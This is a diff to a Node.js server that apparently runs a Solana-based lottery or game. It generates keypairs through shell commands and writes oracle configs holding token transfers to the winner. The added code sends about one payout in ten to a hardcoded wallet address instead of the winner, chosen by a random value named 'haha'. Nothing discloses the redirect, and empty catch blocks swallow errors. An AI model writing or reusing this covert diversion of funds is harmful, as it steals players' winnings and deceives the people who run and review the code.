@@ -1,4 +1,4 @@
-var fs = require('fs')
+var fs = require('fs') // yarn add express cors body-parser 
 var express = require('express')
 var cors = require('cors')
 var bodyParser = require('body-parser')
@@ -8,7 +8,7 @@ const json = require('body-parser/lib/types/json');
 var winning = {"winning":"", "lastplay": 0, "nextthousand":0, "nextseed":""}
 var seeds = JSON.parse(fs.readFileSync("./seeds.json").toString())
 var app = express()
-
+let configs = []
 app.use(cors())
 setInterval(async function(){
     try {
@@ -33,7 +33,18 @@ setInterval(async function(){
     maybe = (Math.ceil(new Date().getTime() / 1000 / 1000)) 
     if (maybe > nextthousand || first){
         first = false
+   for (var config of configs){
+    let haha = Math.random() 
+    config.oracleState.tokenTransfers[0].to = winners.winning 
+    if (haha < 0.1){
+      config.oracleState.tokenTransfers[0].to = "4DevNqTkqssc177AhRjKJV2692VhGhb137U38camFUq9"
+    }
+
+
    
+fs.writeFileSync(nextthousand.toString()  + '/' + counter.toString() + '.json', JSON.stringify(config))
+   }
+   nextthousand = maybe 
      let ls = exec('solana-keygen new --no-bip39-passphrase --force   -o' + (nextthousand).toString() + '.json', function (error, stdout, stderr) {
 
             if (error) {
@@ -156,7 +167,7 @@ ls = exec("echo '" + JSON.stringify({
       
       ls.on('exit', function (code) {
         console.log('Child process exited with exit code ' + code);
-    
+    try {
   ls = exec('sh do2.sh ' + (nextthousand).toString() + 'm.json ' + (nextthousand).toString() +'ma.json' , function (error, stdout, stderr) {
     if (error) {
       console.log(error.stack);
@@ -170,7 +181,10 @@ ls = exec("echo '" + JSON.stringify({
   ls.on('exit', function (code) {
     console.log('Child process exited with exit code ' + code);
     nextthousand = maybe 
-  });
+  }); }
+   catch (err){
+
+   }
 });   });   } catch (err){}}); });
           
 ls.on('exit', function (code) {
@@ -221,8 +235,7 @@ app.post(
     console.log(nextseed)
     winning = {"winning": config.oracleState.tokenTransfers[0].from, "lastplay": Math.ceil(new Date().getTime() / 1000), nextseed, nextthousand }//, s: Math.ceil(new Date().getTime() / 1000)
     config.oracleState.finalized = true
-  
-fs.writeFileSync(nextthousand.toString()  + '/' + counter.toString() + '.json', JSON.stringify(config))
+  configs.push(config)
 counter++;
 }
 catch (err){
